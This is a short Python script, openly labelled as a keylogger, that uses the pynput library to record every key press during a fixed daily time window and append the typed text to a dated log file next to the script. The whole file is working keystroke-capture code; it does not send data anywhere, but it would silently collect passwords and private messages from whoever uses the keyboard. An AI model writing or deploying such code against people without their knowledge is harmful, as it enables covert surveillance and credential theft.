# Print Logs Files Of Captured Keylogger


import os
import time
from datetime import datetime
from pynput.keyboard import Listener

#------------------------------------------------------------------------
START_TIME = "09:00" # <-- Start The Of Capture Keys 
END_TIME = "14:40"  # <-- End The Of Capture Keys
#------------------------------------------------------------------------

buffer = ""
print("Script started")
with open("test.log", "a") as f:
    f.write("Hello\n")

def get_log_file():
    date = datetime.now().strftime("%d-%m-%Y")
    return f"{date}.log"

def is_running_time():
    now = datetime.now().strftime("%H:%M")
    return START_TIME <= now < END_TIME

def on_press(key):
    global buffer

    if not is_running_time():
        return

    try:
        buffer += key.char
    except AttributeError:
        if key == key.space:
            buffer += " "
        elif key == key.enter:
            buffer += "\n"
        elif key == key.backspace:
            if buffer:
                buffer = buffer[:-1]

    script_dir = os.path.dirname(os.path.abspath(__file__))
    full_path = os.path.join(script_dir, get_log_file())

    with open(full_path, "a", encoding="utf-8") as f:
        f.write(buffer)

    buffer = ""

print("Starting...")

with Listener(on_press=on_press) as listener:
    listener.join()





    